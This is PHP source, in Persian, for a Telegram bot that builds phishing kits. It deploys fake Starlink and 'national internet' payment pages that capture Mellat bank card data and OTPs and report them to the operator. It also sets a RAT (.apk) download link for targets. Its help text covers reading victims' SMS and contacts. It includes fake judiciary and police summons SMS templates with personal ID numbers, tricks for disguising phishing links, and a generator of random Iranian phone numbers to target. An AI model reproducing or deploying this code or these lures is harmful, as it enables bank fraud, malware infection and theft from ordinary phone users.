          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/starlink");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/starlink/index.html","data/$chat_id/payment/$rand/starlink/index.html");
copy("source/starlink/loading.html","data/$chat_id/payment/$rand/starlink/loading.html");
copy("source/starlink/style.css","data/$chat_id/payment/$rand/starlink/style.css");
copy("source/starlink/send.php","data/$chat_id/payment/$rand/starlink/send.php");
copy("source/starlink/description.html","data/$chat_id/payment/$rand/starlink/description.html");
copy("source/starlink/script.js","data/$chat_id/payment/$rand/starlink/script.js");
copy("source/starlink/city.js","data/$chat_id/payment/$rand/starlink/city.js");

      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "استارلینک" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/starlink",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "استارلینک" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/starlink", 'code' => $rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه استارلینک شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/starlink/index.html
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/starlink/index.html
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"starlink"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
                 elseif($query == "starlink_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/54",
                'caption'=>"نمونه درگاه  استارلینک ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
             ]);
    }
##----------------------------------------##
elseif($query == "netmelli"){

file_put_contents("data/$query_id/step.txt","azz11make_bsaaaa1kos1");


                bot('editMessageText',[ 

    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"netmelli_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="azz11make_bsaaaa1kos1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه اینترنت ملی ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/netmelli");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/netmelli/index.php","data/$chat_id/payment/$rand/netmelli/index.php");
copy("source/netmelli/Vazir.eot","data/$chat_id/payment/$rand/netmelli/Vazir.eot");
copy("source/netmelli/scripts.js","data/$chat_id/payment/$rand/netmelli/scripts.js");
copy("source/netmelli/Vazir.ttf","data/$chat_id/payment/$rand/netmelli/Vazir.ttf");
copy("source/netmelli/font-awesome.min.css","data/$chat_id/payment/$rand/netmelli/font-awesome.min.css");
copy("source/netmelli/bootstrap.min.css","data/$chat_id/payment/$rand/netmelli/bootstrap.min.css");
copy("source/netmelli/style.css","data/$chat_id/payment/$rand/netmelli/style.css");
copy("source/netmelli/fontawesome-webfont.eot","data/$chat_id/payment/$rand/netmelli/fontawesome-webfont.eot");
copy("source/netmelli/fontawesome-webfont.ttf","data/$chat_id/payment/$rand/netmelli/fontawesome-webfont.ttf");
copy("source/netmelli/fontawesome-webfont.woff","data/$chat_id/payment/$rand/netmelli/fontawesome-webfont.woff");
copy("source/netmelli/fontawesome-webfont.woff2","data/$chat_id/payment/$rand/netmelli/woff2.css");
copy("source/netmelli/style.css","data/$chat_id/payment/$rand/netmelli/style.css");
copy("source/netmelli/Vazir.woff","data/$chat_id/payment/$rand/netmelli/Vazir.woff");
copy("source/netmelli/Vazir.woff2","data/$chat_id/payment/$rand/netmelli/Vazir.woff2");
copy("source/netmelli/jquery-3.1.1.min.js","data/$chat_id/payment/$rand/netmelli/jquery-3.1.1.min.js");
copy("source/netmelli/FontAwesome.otf","data/$chat_id/payment/$rand/netmelli/FontAwesome.otf");

      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "اینترنت ملی" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/netmelli",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "اینترنت ملی" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/netmelli", 'code' => $rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه اینترنت ملی شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/netmelli/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/netmelli/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"netmelli"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
                 elseif($query == "netmelli_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/55",
                'caption'=>"نمونه درگاه  اینترنت ملی ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
             ]);
    }
##----------------------------------------##
    elseif($query == "rl"){
    $dir = scandir("data/$query_id/rat_list");
    $diff = array_diff($dir, ['.','..']);
    foreach($diff as $value){
       $js = file_get_contents("data/$query_id/rat_list/$value");
       $array = json_decode($js , true);
         $name = $array["name"];
         $token = $array["token"];
         $url = $array["url"];
       $answer .= "📖 نوع رت  : $name \n 🛠 توکن  : $token \n 🎫 لینک شخصی  : $url \n➖➖➖➖➖➖➖➖➖\n
       ";
       
editmessage($query_id,$query_messageid,"لیست رت های شما : \n \n $answer","html",json_encode([
    'inline_keyboard'=>[
        [['text'=>"بازگشت به منوی اصلی ",'callback_data'=>"back"]],
        ]
    ]));
    }
    }
                    elseif($query == "delr"){
        file_put_contents("data/$query_id/step.txt","del_r1");
                  bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="del_r1"){
        if(file_exists("data/$chat_id/rat_list/$text.json")){
            
                file_put_contents("data/$chat_id/step.txt","none");
                $json = json_decode(file_get_contents("data/$chat_id/rat_list/$text.json"),true);
                $name = $json['name'];
                $address = $json['url'];
                unlink("data/$chat_id/rat_list/$text.json");
                del("data/$chat_id/rat/".$code);
     sendmessage($chat_id,"رت شما با مشخصات زیر حذف شد
     ----------------
     نوع رت : $name
     توکن : $text
     لینک شخصی : $address
     ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],
           ]
           ]));
        }else{
                file_put_contents("data/$chat_id/step.txt","none");
sendmessage($chat_id,"رتی با این توکن ساخته نشده !","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"delr"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],
           ]
           ]));
        }
    }
    ##-----------------------##
    elseif($query == "setrat"){
              file_put_contents("data/$query_id/step.txt","setrat");
                         bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
لینک رت خود را ارسال کنید
لینک رت درون سایت نیز ست خواهد شد و تارگت روی دکمه دانلود نرم افزار کلیک کند این رت دانلود خواهد شد

مانند نمونه : https://uupload.ir/rat.apk
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="setrat"){
        if(preg_match("/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i",$text) and preg_match("/.apk/",$text)){
             sendmessage($chat_id,"لینک مورد نظر با موفقیت تنظیم شد","html",$message_id);
              file_put_contents("data/$chat_id/step.txt","none");
             file_put_contents("data/$chat_id/rat.txt",$text);
 
        }else{
            sendmessage($chat_id,"لینک مورد نظر اشتباه یا فرمت آن apk نیست","html",$message_id);
            file_put_contents("data/$chat_id/step.txt","none");
        }
    }
elseif($query == "help"and file_get_contents("status.txt")=="on"){
                           bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
برای اد کردن به گپ، یکبار درگاه بسازید بعد از قسمت تغییر ایدی عددیایدی عددی گپ را ارسال کنید
➖➖➖➖➖➖➖➖
ربات کامل ضد نفوذ میباشد پس فکر دیفیس و نفوذ رو بزار کنار
➖➖➖➖➖➖➖➖
چگونه رت رو توی سایت تنظیم کنیم تا تارگت اون رو دانلود کنه،از قسمت تنظیم رت لینک رت خود را با پسوند .apk ارسال کنید تا خودکار تنظیم شود
➖➖➖➖➖➖➖➖
در قسمت داشبورد > دریافت موجودی با فایل پیامک
میتونید فایل sms های تارگت رو بدید و موجودی کارتشو دریافت کنید
➖➖➖➖➖➖➖➖
رنج و شماره ساز پیشرفته نیز ربات دارا میباشد، صفا کنید
➖➖➖➖➖➖➖➖
همچنین در قسمت داشبورد > دریافت مخاطبین با فایل نیز میتوانید شماره های مخاطبین تارگت را دریافت و به انها sms ارسال کنید :)

Coded By @BlackSoldier_Owner
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
}elseif($query == "text"){
    bot('editMessageText',[ 
        'chat_id'=>$query_id, 
        'message_id'=>$query_messageid,
        'text'=>"
        با شماره کدملی:0019863168
        فرزند : محمدعلی 
        تلفن همراه شما با درخواست مرجع پلیس فتا؛اداره مبارزه با جرائم سایبری با شماره نامه 190031020314116 که در تاریخ 1400/09/21 صادر شده است تا تاریخ 1400/09/22 قطع میگردد. برای جلوگیری از این اتفاق از طریق اپلیکیشن عدالت همراه اقدام کنید؛ ابلاغیه در پنل کاربری ثبت شد.
        https://
        ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
        شماره : 09301004804
        
        آقای محسن کاظمي با کدملی 0060868244 ابلاغیه الکترونیکی شماره 9293100964290967 در حساب کاربری شما در سایت ابلاغ قرار گرفت. تاریخ ابلاغ 1400/07/01 
        برای چک کردند ابلاغ به سایت زیر مراجعه نمایید :
        https://
        ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
        ابـ‌لاغیه الکـ‌ترونیکی شماره 140009100037752136 در حساب کاربری شما در سا‌مانه ابـ‌لا‌غ قرار گرفت.
        تاریخ ابـ‌لا‌غ 1400/10/15
        جهت پیـ‌گیری و مشاهده شکا‌ی‍ـ‌ت ثبت شده علیه شما تا 24 ساعت آینده از لینک زیر اقدام نمایید :
        https://
         در صورت نياز به حضور ، ا‌بـ‌لاغ خواهد شد . 
        قـ‌و‌ه قضـ‌ا‌ئـیـه جمهوری اسلامی ایران
        ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
        ابلاغیه الکترونیکی شماره 9293100964290967 در حساب کاربری شما در سایت ابلاغ قرار گرفت. تاریخ ابلاغ 1400/07/01
        برای چک کردند ابلاغ به لینک زیر مراجعه نمایید :
        https://
        ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
        ابلاغ اخطاریه/احضاریه تعیین مهلت جهت انجام کاری برای شخص ذی سمت ومرتبط
        علت حضور: دفاع از اتهام انتسابی 
        مهلت پیگیری ۱۲ ساعت 
        لینک قوه قضائیه:  
        https://
        باتوجه به علت حضور مندرج در این ابلاغیه به شما ابلاغ می‌گردد ظرف مهلت مقرراقدام؛درغیراینصورت مطابق مقررات اتخاذ تصمیم خواهد شد.
        نتیجه عدم پیگیری جلب است.
        ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
        آخرین اخطار مشاهده ابلاغیه؛ شکواییه علیه شما با کد رهگیری : 8900115687 به وزارت اطلاعات ارسال شد.
        جزئیات بیشتر با دانلود اپلیکیشن عدالت همراه (اندروید) :
        https://
        در صورت نادیده گرفتن حکم جلب صادر خواهد شد.
        ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
        (ابلاغیه اخطاریه)
        پرونده شماره 8979001267  به شعبه 109 کیفری دیوان عالی کشور ارجاع گردید جهت پیگیری از درگاه ملی قوه قضاییه :
        https://
        اقدام نمایید
        پیشخوان تنظیم کننده : دیوان عالی کشور
        ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
        بدینوسیله در اجرای دستور مقام محترم قضایی
        به شما ابلاغ میگردد به عنوان مطلع جهت پاره ایی از توضیحات ظرف دو روز پس از تاریخ ابلاغ طی شماره پرونده : 140075842/68 
        خود را به نزدیک ترین دادسرا حل اختلاف معرفی نمایید. در صورت عدم پیگیری و حضور 
        دستور تصمیم بعدی مقام محترم قضایی اتخاذ خواهد شد.
        پیگیری الکترونیکی پرونده : ‌
        https://  ️
        ",
        'parse_mode'=>"html",
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"<<--",'callback_data'=>"back"]]
                ]
            ])
        ]);   
}
##-----------------------##
elseif($query == "sendtext"){
    bot('editMessageText',[ 
        'chat_id'=>$query_id, 
        'message_id'=>$query_messageid,
        'text'=>'
روش اول : برنامه Fonts را از گوگل پلی دانلود کن، یه کیبورده، بعد دامینتو به صورت فونت دار بنویس و کپی کن بعد ارسال، دامین فریم میره
➖➖➖➖➖➖➖➖➖➖
روش دوم : یه وبلاگ میسازید از blog.ir، قالب رو ادیت میزنید و کد زیر رو میزارید توش
<meta http-equiv="refresh" content="0; url=PORT">
بجای PORT آدرس درگاه بزارید و در ارسال پیام از آدرس وبلاگ استفاده کنید
➖➖➖➖➖➖➖➖➖➖
روش سوم : میرید سرور میخرید زمپ روش ران میکنید یه فایل ریدایرکت هم میسازید بعد با آیپی سرور اس میزنید، این روش مخصوص کسایی که از سرور و این کسشعرا سر در میارن هس
        ',
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"<<--",'callback_data'=>"back"]]
                ]
            ])
        ]);   
}
##------------##
elseif($text == "/creator"){
    sendmessage($chat_id,"Coded BY @BlackSoldier_TM","html",$message_id); // کص ننت این قسمت رو دست بزنی :|
}
##------------##
elseif($query == "number_gen"){
    bot('editMessageText',[ 
        'chat_id'=>$query_id, 
        'message_id'=>$query_messageid,
        'text'=>'
یک رنج را از لیست زیر انتخاب کنید
        ',
        'parse_mode'=>"html",
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"0912",'callback_data'=>"0912"],['text'=>"0917",'callback_data'=>"0917"]],
                [['text'=>"0916",'callback_data'=>"0916"],['text'=>"0915",'callback_data'=>"0915"]],
                [['text'=>"0922",'callback_data'=>"0922"],['text'=>"0937",'callback_data'=>"0937"]],
                [['text'=>"0930",'callback_data'=>"0930"],['text'=>"0919",'callback_data'=>"0919"]],
                [['text'=>"0921",'callback_data'=>"0921"],['text'=>"0914",'callback_data'=>"0914"]],
                [['text'=>"<<--",'callback_data'=>"back"]]
                ]
            ])
        ]);   
}
elseif($query == "0912"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0912';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"<<--",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0917"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0917';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"<<--",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0916"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0916';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"<<--",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0915"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0915';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"<<--",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0922"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0922';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"<<--",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0937"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0937';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"<<--",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0930"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0930';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"<<--",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0919"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0919';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"<<--",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0921"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0921';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"<<--",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0914"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0914';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"<<--",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}

##---------------------------------##
if(strpos($text,".php") !== false or strpos($text,".html") !== false or strpos($text,".txt") !== false or strpos($text,"copy") !== false or strpos($text,'$_SERVER') !== false or strpos($text,"array") !== false or strpos($text,"function") !== false or strpos($text,"class") !== false or strpos($text,'<?php') !== false or strpos($text,"?>") !== false){
    if($chat_id !== $admin){
sendmessage($chat_id,"به دلیل استفاده از کد مخرب از ربات مسدود شدید","html",$message_id);
  sendmessage($admin,"ادمین عزیز یک گزارش دریافت شد
===================
نوع گزارش » استفاده از کد مخرب
آیدی عددی » $chat_id
نام کاربری » @$username
وضعیت کاربر » مسدود
===================
کد ارسال شده » <code>$text</code>","html",$messaj2s92);
  file_put_contents("data/$chat_id/status","ban");
  
}
}
##---------------------------------##
elseif($text == "/panel"){
    if($admin == $chat_id){
      file_put_contents("data/$admin/step.txt","none");
    sendmessage($chat_id,"سلام ادمین عزیز، به پنل مدیریت خوش آمدید","html",$message_id,$admin_panel);
      }else{
      sendmessage($chat_id,"شما ادمین ربات نیستید","html",$message_id);
      sendmessage($admin,"
ادمین عزیز یک گزارش دریافت شد
===================
نوع گزارش » تلاش برای ورود به پنل مدیریت
آیدی عددی » $chat_id
نام کاربری » @$username
وضعیت کاربر » آزاد","html",$message_iI2jsd);
    }
  }
